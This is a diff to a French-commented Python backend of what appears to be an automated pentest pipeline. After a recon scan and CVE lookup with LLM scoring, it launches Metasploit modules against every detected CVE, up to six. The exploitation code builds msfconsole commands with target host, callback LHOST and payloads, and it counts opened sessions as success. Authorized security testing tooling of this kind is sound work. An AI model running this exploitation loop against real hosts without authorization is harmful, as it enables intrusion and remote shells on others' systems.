@@ -116,6 +116,10 @@ def launch_scan(data: LaunchScanRequest, db: Session = Depends(get_db), user=Dep
         full_output = ""
         llm_analysis = ""
         exploit_result = ""
+        findings = []          # multi-services : 1 entree par CVE detectee
+        n_success = 0
+        primary = None
+        MAX_CIBLES = 6         # borne le temps total (anti-scan interminable)
 
         try:
             # AGENT 1: RECONNAISSANCE (sortie XML fiable + fallback regex - reproche #5)
@@ -169,103 +173,123 @@ def launch_scan(data: LaunchScanRequest, db: Session = Depends(get_db), user=Dep
             emit_event(sid, "agent_result", "reconnaissance", {"host": host, "latency": latency, "ports": ports, "ports_count": len(ports)})
             emit_event(sid, "agent_complete", "reconnaissance")
 
-            # AGENT 2: RAG LOOKUP (avec seuil de confiance - reproche #3)
+            # AGENT 2: RAG LOOKUP (MULTI-SERVICES, avec seuil de confiance - reproche #3)
             emit_event(sid, "agent_start", "rag_lookup", {"label": "Recherche CVE"})
             SIM_MIN = 0.70
             if ports:
-                from searcher import find_cve_for_service
+                from searcher import find_cve_for_service, get_remediation
                 from service_cve import match_service_cve
-                best_score = -1
-                best_svc = None
-                best_sim = 0.0
+                seen_cves = set()
                 for svc in ports:
                     query_str = f"{svc['service']} {svc['version']}"
                     emit_event(sid, "agent_output", "rag_lookup", output=f"+ rag_query: {query_str}")
+                    f_cve = f_sev = f_sum = None
+                    f_cvss = 0.0
+                    f_sim = 0.0
                     _det = match_service_cve(svc["service"], svc["version"])
                     if _det:
-                        emit_event(sid, "agent_output", "rag_lookup", output="  match direct (empreinte service) -> " + _det["cve_id"])
-                        _det_cvss = float(_det["cvss"])
-                        if _det_cvss > best_score:
-                            best_score = _det_cvss
-                            cve_id = _det["cve_id"]
-                            severity = _det["severity"]
-                            cvss = str(_det_cvss)
-                            summary = _det["text"]
-                            best_svc = svc
-                            best_sim = 1.0
-                        continue
-                    cves = find_cve_for_service(svc["service"], svc["version"], limit=1)
-                    if cves:
-                        c = cves[0]
-                        sim = float(c.get("score") or 0)
-                        emit_event(sid, "agent_output", "rag_lookup", output=f"  similarite {round(sim, 3)} (seuil {SIM_MIN})")
-                        if sim < SIM_MIN:
-                            continue
-                        c_cvss = float(c.get("cvss") or c.get("cvss_score") or 0)
-                        if c_cvss > best_score:
-                            best_score = c_cvss
-                            cve_id = c.get("cve_id")
-                            severity = c.get("severity", "low")
-                            cvss = str(c_cvss)
-                            summary = c.get("text", "")
-                            best_svc = svc
-                            best_sim = sim
-                if cve_id:
-                    from searcher import get_remediation
-                    reco = get_remediation(cve_id)
-                    summary = summary + " || REMEDIATION: " + reco
-                    emit_event(sid, "agent_result", "rag_lookup", {"cve_id": cve_id, "cvss": cvss, "severity": severity, "similarity": round(best_sim, 3)})
-                    emit_event(sid, "agent_output", "rag_lookup", output=f"CVE trouvee: {cve_id} (CVSS {cvss}, {severity.upper()}, sim {round(best_sim, 3)})")
+                        f_cve = _det["cve_id"]; f_sev = _det["severity"]
+                        f_cvss = float(_det["cvss"]); f_sum = _det["text"]; f_sim = 1.0
+                        emit_event(sid, "agent_output", "rag_lookup", output="  match direct (empreinte service) -> " + f_cve)
+                    else:
+                        cves = find_cve_for_service(svc["service"], svc["version"], limit=1)
+                        if cves:
+                            c = cves[0]
+                            sim = float(c.get("score") or 0)
+                            emit_event(sid, "agent_output", "rag_lookup", output=f"  similarite {round(sim, 3)} (seuil {SIM_MIN})")
+                            if sim >= SIM_MIN:
+                                f_cve = c.get("cve_id"); f_sev = c.get("severity", "low")
+                                f_cvss = float(c.get("cvss") or c.get("cvss_score") or 0)
+                                f_sum = c.get("text", ""); f_sim = sim
+                    if f_cve and f_cve not in seen_cves:
+                        seen_cves.add(f_cve)
+                        reco = get_remediation(f_cve)
+                        findings.append({
+                            "svc": svc, "cve_id": f_cve, "severity": f_sev,
+                            "cvss": str(f_cvss), "cvss_num": f_cvss,
+                            "summary": (f_sum or "") + " || REMEDIATION: " + reco,
+                            "sim": f_sim, "exploited": False, "module": None, "analysis": "",
+                        })
+                # trier par CVSS decroissant et borner le nombre de cibles
+                findings.sort(key=lambda x: x["cvss_num"], reverse=True)
+                findings = findings[:MAX_CIBLES]
+                if findings:
+                    emit_event(sid, "agent_result", "rag_lookup", {
+                        "cve_id": findings[0]["cve_id"], "cvss": findings[0]["cvss"],
+                        "severity": findings[0]["severity"], "similarity": round(findings[0]["sim"], 3),
+                        "findings_count": len(findings),
+                        "findings": [{"cve_id": f["cve_id"], "cvss": f["cvss"], "service": f["svc"]["service"]} for f in findings],
+                    })
+                    emit_event(sid, "agent_output", "rag_lookup", output=f"{len(findings)} CVE au-dessus du seuil : " + ", ".join(f["cve_id"] for f in findings))
                 else:
                     emit_event(sid, "agent_output", "rag_lookup", output=f"Aucune CVE au-dessus du seuil ({SIM_MIN})")
             else:
                 emit_event(sid, "agent_output", "rag_lookup", output="Aucun port ouvert")
             emit_event(sid, "agent_complete", "rag_lookup")
 
-            # AGENT 3: EVALUATION CVSS PAR GEMMA (reproche #1 corrige)
+            # cible principale (compat base de donnees + cartes UI)
+            primary = findings[0] if findings else None
+            if primary:
+                cve_id = primary["cve_id"]; severity = primary["severity"]
+                cvss = primary["cvss"]; summary = primary["summary"]
+
+            # AGENT 3: EVALUATION CVSS PAR GEMMA (chaque CVE detectee - reproche #1)
             emit_event(sid, "agent_start", "vulnerability_analysis", {"label": "Analyse de vulnerabilites"})
-            if cve_id:
-                emit_event(sid, "agent_output", "vulnerability_analysis", output=f"+ Gemma evalue le CVSS de {cve_id} sur {host}...")
+            if findings:
                 from ai_cvss import evaluate_cvss
-                _ev = evaluate_cvss(llm_call, host, ports, cve_id, summary, cvss, severity)
-                cvss = _ev["cvss"]
-                severity = _ev["severity"]
-                llm_analysis = _ev["analysis"]
-                for line in llm_analysis.split("\n"):
-                    if line.strip():
-                        emit_event(sid, "agent_output", "vulnerability_analysis", output=line)
-                emit_event(sid, "agent_result", "vulnerability_analysis", {"cve_id": cve_id, "cvss": cvss, "severity": severity, "cvss_vector": _ev["cvss_vector"], "analysis": llm_analysis[:500]})
+                for f in findings:
+                    emit_event(sid, "agent_output", "vulnerability_analysis", output=f"+ Gemma evalue le CVSS de {f['cve_id']} sur {host}...")
+                    _ev = evaluate_cvss(llm_call, host, ports, f["cve_id"], f["summary"], f["cvss"], f["severity"])
+                    f["cvss"] = _ev["cvss"]; f["severity"] = _ev["severity"]
+                    f["cvss_vector"] = _ev.get("cvss_vector", "")
+                    f["analysis"] = _ev["analysis"]
+                    for line in f["analysis"].split("\n"):
+                        if line.strip():
+                            emit_event(sid, "agent_output", "vulnerability_analysis", output=line)
+                # re-trier apres evaluation Gemma, mettre a jour la cible principale
+                findings.sort(key=lambda x: float(x["cvss"] or 0), reverse=True)
+                primary = findings[0]
+                cve_id = primary["cve_id"]; severity = primary["severity"]; cvss = primary["cvss"]
+                llm_analysis = primary.get("analysis", "")
+                emit_event(sid, "agent_result", "vulnerability_analysis", {
+                    "cve_id": cve_id, "cvss": cvss, "severity": severity,
+                    "cvss_vector": primary.get("cvss_vector", ""), "analysis": llm_analysis[:500],
+                })
             else:
                 emit_event(sid, "agent_output", "vulnerability_analysis", output="Pas de CVE a analyser - hote semble securise")
                 emit_event(sid, "agent_result", "vulnerability_analysis", {"cve_id": None, "cvss": "0.0", "severity": "none", "analysis": "Aucune vulnerabilite critique."})
             emit_event(sid, "agent_complete", "vulnerability_analysis")
 
-            # AGENT 4: EXPLOITATION (METASPLOIT - module fiable, reproche #2)
+            # AGENT 4: EXPLOITATION (METASPLOIT - CHAQUE CVE detectee - reproche #2)
             emit_event(sid, "agent_start", "exploitation", {"label": "Exploitation"})
-            if cve_id:
+            if findings:
                 from msf_modules import get_msf_module, get_msf_payload
+                import socket as _sock, select as _select, time as _time
+                try:
+                    _s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
+                    _s.connect(("8.8.8.8", 80))
+                    _lhost = _s.getsockname()[0]
+                    _s.close()
+                except Exception:
+                    _lhost = "127.0.0.1"
+                emit_event(sid, "agent_output", "exploitation", output="+ LHOST (adresse de retour) = " + _lhost)
                 _ctx = "Services: " + ", ".join(p["service"] + " " + p["version"] for p in ports)
-                msf_module, _map_rport, _origin = get_msf_module(cve_id, llm_call, _ctx)
-                if not msf_module:
-                    emit_event(sid, "agent_output", "exploitation", output=f"Aucun module Metasploit connu pour {cve_id}")
-                    emit_event(sid, "agent_result", "exploitation", {"module": None, "target": host, "success": False, "output": "Pas de module"})
-                else:
-                    _rport = _map_rport or (ports[0]["port"] if ports else 445)
-                    emit_event(sid, "agent_output", "exploitation", output=f"+ Module ({_origin}): {msf_module}  RPORT={_rport}")
-                    import socket as _sock
-                    try:
-                        _s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
-                        _s.connect(("8.8.8.8", 80))
-                        _lhost = _s.getsockname()[0]
-                        _s.close()
-                    except Exception:
-                        _lhost = "127.0.0.1"
-                    emit_event(sid, "agent_output", "exploitation", output="+ LHOST (adresse de retour) = " + _lhost)
-                    msf_cmd = f"use {msf_module}; set RHOSTS {host}; set RPORT {_rport}; set LHOST {_lhost}; {('set PAYLOAD ' + get_msf_payload(cve_id) + '; ') if get_msf_payload(cve_id) else ''}set VERBOSE true; run -z; exit -y"
+                exploit_blocks = []
+                for f in findings:
+                    _cve = f["cve_id"]
+                    msf_module, _map_rport, _origin = get_msf_module(_cve, llm_call, _ctx)
+                    if not msf_module:
+                        emit_event(sid, "agent_output", "exploitation", output=f"[{_cve}] Aucun module Metasploit connu")
+                        exploit_blocks.append(f"### {_cve}: pas de module")
+                        continue
+                    f["module"] = msf_module
+                    _rport = _map_rport or f["svc"].get("port") or (ports[0]["port"] if ports else 445)
+                    emit_event(sid, "agent_output", "exploitation", output=f"=== [{_cve}] Module ({_origin}): {msf_module}  RPORT={_rport} ===")
+                    _pl = get_msf_payload(_cve)
+                    msf_cmd = f"use {msf_module}; set RHOSTS {host}; set RPORT {_rport}; set LHOST {_lhost}; {('set PAYLOAD ' + _pl + '; ') if _pl else ''}set VERBOSE true; run -z; exit -y"
                     try:
                         msf_proc = subprocess.Popen(["msfconsole", "-q", "-x", msf_cmd], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                         msf_lines = []
-                        import select as _select, time as _time
                         msf_deadline = _time.time() + 180
                         while _time.time() < msf_deadline:
                             ready, _, _ = _select.select([msf_proc.stdout], [], [], 2.0)
@@ -280,30 +304,50 @@ def launch_scan(data: LaunchScanRequest, db: Session = Depends(get_db), user=Dep
                                 break
                         else:
                             msf_proc.kill()
-                            emit_event(sid, "agent_output", "exploitation", output="Timeout 180s - Metasploit arrete")
+                            emit_event(sid, "agent_output", "exploitation", output=f"[{_cve}] Timeout 180s - Metasploit arrete")
                         try:
                             msf_proc.stdout.close()
                         except Exception:
                             pass
-                        exploit_result = "\n".join(msf_lines)
-                        _low = exploit_result.lower()
-                        success = ("session" in _low and "opened" in _low) or "meterpreter" in _low
-                        emit_event(sid, "agent_result", "exploitation", {"module": msf_module, "target": host, "success": success, "output": exploit_result[:300]})
-                        emit_event(sid, "agent_output", "exploitation", output=("EXPLOITATION REUSSIE - session ouverte" if success else "Exploitation non confirmee"))
+                        _out = "\n".join(msf_lines)
+                        _low = _out.lower()
+                        _ok = ("session" in _low and "opened" in _low) or "meterpreter" in _low
+                        f["exploited"] = _ok
+                        if _ok:
+                            n_success += 1
+                        exploit_blocks.append(f"### {_cve} ({msf_module}) -> {'REUSSI' if _ok else 'echec'}\n" + _out[:1000])
+                        emit_event(sid, "agent_output", "exploitation", output=(f"[{_cve}] EXPLOITATION REUSSIE - session ouverte" if _ok else f"[{_cve}] Exploitation non confirmee"))
                     except Exception as msf_err:
-                        emit_event(sid, "agent_output", "exploitation", output=f"Metasploit: {msf_err}")
-                        emit_event(sid, "agent_result", "exploitation", {"module": msf_module, "target": host, "success": False, "output": str(msf_err)})
+                        emit_event(sid, "agent_output", "exploitation", output=f"[{_cve}] Metasploit: {msf_err}")
+                        exploit_blocks.append(f"### {_cve}: erreur {msf_err}")
+                exploit_result = "\n\n".join(exploit_blocks)
+                emit_event(sid, "agent_result", "exploitation", {
+                    "module": findings[0].get("module"),
+                    "target": host,
+                    "success": n_success > 0,
+                    "exploited_count": n_success,
+                    "total": len(findings),
+                    "details": [{"cve_id": f["cve_id"], "module": f.get("module"), "success": f["exploited"]} for f in findings],
+                    "output": exploit_result[:300],
+                })
+                emit_event(sid, "agent_output", "exploitation", output=f"BILAN EXPLOITATION : {n_success}/{len(findings)} session(s) ouverte(s)")
             else:
                 emit_event(sid, "agent_output", "exploitation", output="Pas de CVE - exploitation ignoree")
                 emit_event(sid, "agent_result", "exploitation", {"module": None, "target": host, "success": False, "output": ""})
             emit_event(sid, "agent_complete", "exploitation")
 
-            # AGENT 5: RAPPORT
+            # AGENT 5: RAPPORT (consolide toutes les cibles)
             emit_event(sid, "agent_start", "report", {"label": "Generation du rapport"})
             emit_event(sid, "agent_output", "report", output="+ Consolidation du rapport...")
-            if cve_id:
-                emit_event(sid, "agent_output", "report", output=f"+ CVE: {cve_id}  CVSS: {cvss}  Severite: {severity.upper()}")
+            for f in findings:
+                _st = "exploite" if f["exploited"] else "detecte"
+                emit_event(sid, "agent_output", "report", output=f"+ {f['cve_id']}  CVSS {f['cvss']}  {f['severity'].upper()}  [{_st}]")
             emit_event(sid, "agent_output", "report", output="+ Enregistrement en base...")
+            _findings_txt = "\n".join(
+                f"- {f['cve_id']} | CVSS {f['cvss']} | {f['severity']} | "
+                f"{'EXPLOITE' if f['exploited'] else 'detecte'} | module {f.get('module') or '-'}"
+                for f in findings
+            )
             s = db2.query(Scan).filter(Scan.id == sid).first()
             if s:
                 s.status = "completed"
@@ -312,11 +356,15 @@ def launch_scan(data: LaunchScanRequest, db: Session = Depends(get_db), user=Dep
                 s.severity = severity
                 s.cvss_score = cvss
                 s.client_summary = summary
-                s.raw_output = full_output + "\n\n=== LLM ANALYSIS ===\n" + llm_analysis + "\n\n=== EXPLOIT ===\n" + exploit_result
+                s.raw_output = (full_output
+                                + "\n\n=== FINDINGS (" + str(len(findings)) + ") ===\n" + _findings_txt
+                                + "\n\n=== LLM ANALYSIS (cible principale) ===\n" + llm_analysis
+                                + "\n\n=== EXPLOIT ===\n" + exploit_result)
                 db2.commit()
-            emit_event(sid, "agent_output", "report", output="Rapport enregistre avec succes")
+            emit_event(sid, "agent_output", "report", output=f"Rapport enregistre ({n_success}/{len(findings)} exploite(s))")
             emit_event(sid, "agent_complete", "report")
-            emit_event(sid, "scan_complete", data={"cve_id": cve_id, "severity": severity, "cvss": cvss})
+            emit_event(sid, "scan_complete", data={"cve_id": cve_id, "severity": severity, "cvss": cvss,
+                                                   "exploited_count": n_success, "findings_count": len(findings)})
 
         except Exception as e:
             import traceback
